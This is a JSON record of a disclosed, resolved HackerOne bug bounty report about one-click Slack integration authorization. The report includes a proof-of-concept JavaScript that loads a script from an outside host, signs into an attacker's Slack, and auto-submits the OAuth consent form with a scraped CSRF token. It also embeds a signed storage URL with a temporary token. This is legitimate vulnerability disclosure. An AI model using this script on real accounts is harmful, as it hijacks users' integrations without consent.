@@ -1,0 +1,215 @@
+{
+  "id": 172289,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzIyODk=",
+  "url": "https://hackerone.com/reports/172289",
+  "title": "HackerOne Integrations Design Issue",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-09-27T02:53:47.691Z",
+  "submitted_at": "2016-09-27T02:53:47.691Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "whhackersbr",
+    "url": "/whhackersbr",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/013/529/88a70e872d0b669249b3ef2269fb7ec7eaab85f7_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-04-11T18:12:00.694Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2019-04-10T23:10:44.027Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "###Summary###\n\nHackerOne Integrations Design Issue\n\n###Description (Include Impact)###\n\nThis bug is similar to #170552.\n\nThe `HackerOne Integrations` feature is very sensitive and can not be used with just a click, IMHO, or we can say \"HackerOne users are a click away from​ giving to an attacker very sensitive privileges to his private account\".\n\n * https://youtu.be/YeqfOE-6_FQ\n\nYou really need to explicitly ask the user if he wants to integrate his HackerOne account to an external service, __before__ doing it.\n\nAsking the password to confirm, would be even better.\n\n{F123252}\n\nTry to connect an external account to `Phabricator` to see their approach (protection against CSRF since the start and confirmation screen).\n\n__Exploitability__\n\nAll the attacker needs to exploit it is stealing a click, with something like:\n\n1) Clickjacking (browser 0-day, HackerOne bug, etc.);\n2) Social Engineering;\n3) Exploiting an XSS in Slack quietly, and waiting for the user attempts to integrate the HackerOne with Slack;\n4) Scrolling Attacks: https://www.w3.org/Security/wiki/Clickjacking_Threats#Scrolling_attacks;\n5) Repositioning the Trusted Window: https://www.w3.org/Security/wiki/Clickjacking_Threats#Repositioning_the_trusted_window;\n\nEtc.\n\n###Steps To Reproduce###\n\n1. Open https://whhackersbr.slack.com/XSS_VULNERABLE_PAGE?parameter=PAYLOAD;\n2. Execute the following code in the browser's console;\n\n```\n/* FAKE SLACK XSS */\nvar newScript = document.createElement('script');\nnewScript.setAttribute('src', 'https://dotfivelabs.com.br/teste-BB32FE5A/css/hackerone-integrations.js');\ndocument.head.appendChild(newScript);\n```\n\n### Optional: Your Environment (Browser version, Device, etc)\n\n * Firefox 48.0.2\n * Mac OS X 10.8.5\n\n### Supporting Material/References\n\n * https://youtu.be/YeqfOE-6_FQ\n\n`hackerone-integrations.js` source-code:\n```\nvar puppet_window;\n\nfunction http(method, url, data = null){\n\tvar xhttp = new XMLHttpRequest();\n\txhttp.open(method, url, false);\n\tif(data){\n\t\txhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\n\t}\n\txhttp.send(data);\n\treturn xhttp.responseText;\n}\n\nfunction slackLogin(){\n\t console.clear();\n\tconsole.log(\"Signing in with the Attacker's Slack Account\");\n\tvar response = http(\"GET\", \"https://whhackersbr.slack.com\");\n\tvar csrf_token = response.match(/name\\=\\\"crumb\\\" value\\=\\\"(.*?)\\\" \\/\\>/i)[1];\t//\"\n\ttry{\n\t\thttp(\"POST\", \"https://whhackersbr.slack.com\", \"signin=1&redir=&crumb=\"+encodeURI(csrf_token)+\"&email=hackerone%40██████&password=teste123&remember=on\");\n\t}\n\tcatch(err){\n\t}\n}\n\nfunction openWindow(url){\n\tconsole.clear();\n\tconsole.log(\"Opening HackerOne Integrations Window\");\n\tpuppet_window = window.open(url, \"_blank\", \"menubar=no,status=no,titlebar=no,toolbar=yes,scrollbars=no,resizable=no,top=0,left=200,width=960,height=350\");\n}\n\nfunction windowCrossDomainFinish(){\n\tconsole.clear();\n\tconsole.log(\"Waiting Stolen Click\");\n\ttry{\n\t\tpuppet_window.document;\n\t\tsetTimeout(function(){acceptOAuth()}, 2500);\n\t}\n\tcatch(err){\n\t\tsetTimeout(function(){windowCrossDomainFinish()}, 500);\n\t}\n}\n\nfunction acceptOAuth(){\n\tconsole.clear();\n\tconsole.log(\"Accepting OAuth Authorization Request\");\n\turl = puppet_window.document.getElementById(\"oauth_authorize_confirm_form\").action;\n\tcsrf_token = puppet_window.document.getElementsByName(\"crumb\")[0].value;\n\tpuppet_window.close();\n\tdocument.body.innerHTML = '<form id=\"puppet_form\" action=\"'+url+'\" method=\"post\">\\\n\t\t\t\t\t<input type=\"hidden\" name=\"create_authorization\" value=\"1\"/>\\\n\t\t\t\t\t<input type=\"hidden\" name=\"crumb\" value=\"'+encodeURI(csrf_token)+'\"/>\\\n\t\t\t\t\t<input type=\"hidden\" name=\"channel\" value=\"C03CKQQDQ\"/>\\\n\t\t\t\t  </form>';\n\tdocument.getElementById(\"puppet_form\").submit();\n\tconsole.clear();\n\tconsole.log(\"Game Over\");\n}\n\nconsole.clear();\nconsole.log(\"Starting the attack\");\nslackLogin();\nalert(\"Click on 'Connect with Slack'\");\nopenWindow(\"https://hackerone.com/security/integrations\");\nsetTimeout(function(){windowCrossDomainFinish()}, 1000);\n\n```",
+  "bounty_amount": "500.0",
+  "formatted_bounty": "$500",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 123252,
+      "file_name": "Approval_Screen.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/123/252/6d8c064d1defb4194d8bd116ae934ed6bb0facca/Approval_Screen.png?response-content-disposition=attachment%3B%20filename%3D%22Approval_Screen.png%22%3B%20filename%2A%3DUTF-8%27%27Approval_Screen.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6GV5B44G%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T053501Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEzS910Pk5MSbM25u4%2BcgL4NEZXyUptfPrsyFpoBcqWKAiEAvdZmggq98aW5IsYFmg5CT%2FdS%2BW7T11k4XOORMhtB%2B%2FYqsQUIfhADGgwwMTM2MTkyNzQ4NDkiDG7XhSxHEcQHk9y3ByqOBS8Eneccwnym%2FrvhTYZriMVmSY7WmV0bPO5%2B2TbjOrpT5uihndhYPo6R1g3I8u2bfbnrPyjaRELi7fgzZjHJJUCl2Q7As%2FA21%2BnMYyHgXs35Qd%2FXOsCrT5jOiAVrsfFkD0cl%2BR7EexUtYAB6RBIf5JWhaUuhJ2qDD3KAkHqqpEmJrz4yNL31h9sGBZg86LKXVj2RDX0xM7C12abXwy9o8ns3Ji001Zbn%2B9aDBRY0lnYd40iw7IOUT6gm7BJm2Idls0QgK1DqF2wIVjbNBwVr1FNT1Aw7yWrieN9HS%2BbNZfX%2FKQ5ZGAwOzOyjJFPE1bqKDQTiVN4OndolYZ5FxAIGYdn47F6LD0JwWkzZSY4KbaEjUwIgy73XCNG2JTvK8O4u0HkjXaHT2RTJxTLX8fWxT6lVhXYSUe5j%2FwnItLPXTLf%2F8AU1y8C3Z5aD5k%2FgB%2BGtr4BsfWmArEiw%2FAh8dsD11uPBH1cYJ4wSx3qku5zE7EjrVJWwMWO1qsHeLmKrIjvOThzMT5Rc%2FtcOEstRWyjGfiD2ob7GMmsRt%2B5DYxAeN3Oo72COZ3TnramhKDR1chZ9a15W49AH0Umk87UgY4geTbFaiHyMD2VjJSJphdHhjmPy2%2FM1UJQq7%2BEfAx5VcyHH7KETXqbYuSMEaFZG9B1koTmze7%2BKW%2BZSNFuHXLzwADf8ivmPTqoP1DD0XKRkBYLBrYyV1atOKmZm8NQ%2FiyB6j3ACapBpqhfzlw5zE0ATxnJsOyqU%2BRrAWBB1Mpc6Rba9zY9K%2BeE9%2FWFcrs9TciU9UT1e0Fm3zdkdXQzo%2Fdchs0DmeGdKifrLihkghh%2FUiXpBnCoJA51h03yqoQRPdXDVwQVcrDSOiW9YJA5h1lfJLTDzrbfSBjqxAfGLFz64r2jtOIddBP9cmlhhw4nZ1tm0howAf%2FzXPMaWPpqmYzk7fYgxP5WCMq1pPyfm4VD5v1IJTt%2FJdn6R1yEBmq%2FebtlcUFzp2NN09R6T4IMvGONR8kcZhXZQ6Egf6m8vXZcPBLMDwAcdmOdtAKD%2FnHFx%2FEsbwX7X71MLW81NCKIP%2FkH3L%2BZG5EU4enjnOGnX6cnNp5CR%2F%2F9rnxbnY9rvWwYxst0ueBu%2FwGcgiTn2yQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bee00df0ed6ecf263b05ebc13d6717428d9fd0344a4ee7e209f2bf58249148f6",
+      "file_size": 69750,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-05-10T23:10:44.140Z",
+  "allow_singular_disclosure_after": -225959057.04912403,
+  "singular_disclosure_allowed": true,
+  "vote_count": 36,
+  "voters": [
+    "mr_nn",
+    "whhackersbr",
+    "ali",
+    "luizviana",
+    "logicmap",
+    "savitar0x01",
+    "cuso4",
+    "r3y",
+    "eveeez",
+    "khizer47",
+    "and 26 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "172289",
+  "votes": 36,
+  "latest_disclosable_activity_at": "2019-04-11T18:12:00.630Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:35:01.308990",
+    "source": "https://hackerone.com/reports/172289.json",
+    "report_id": 172289
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzIyODk=",
+    "databaseId": "172289",
+    "title": "HackerOne Integrations Design Issue",
+    "url": "https://hackerone.com/reports/172289",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2019-04-11T18:12:00.694Z",
+    "created_at": "2016-09-27T02:53:47.691Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU3",
+      "name": "Violation of Secure Design Principles",
+      "external_id": "cwe-657"
+    },
+    "severity": {
+      "rating": "medium",
+      "score": 5.8
+    },
+    "reporter": {
+      "username": "whhackersbr"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81OTI5OA==",
+            "amount": "500.00",
+            "awarded_amount": "500.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-08-30T20:30:09.077Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE3MjI4OQ==",
+    "_id": "172289",
+    "disclosed": true,
+    "votes": 36,
+    "latest_disclosable_activity_at": "2019-04-11T18:12:00.630Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzIyODk=",
+      "databaseId": "172289",
+      "title": "HackerOne Integrations Design Issue",
+      "url": "https://hackerone.com/reports/172289",
+      "disclosed_at": "2019-04-11T18:12:00.694Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEz",
+      "handle": "security",
+      "name": "HackerOne",
+      "url": "https://hackerone.com/security",
+      "currency": "usd"
+    }
+  }
+}
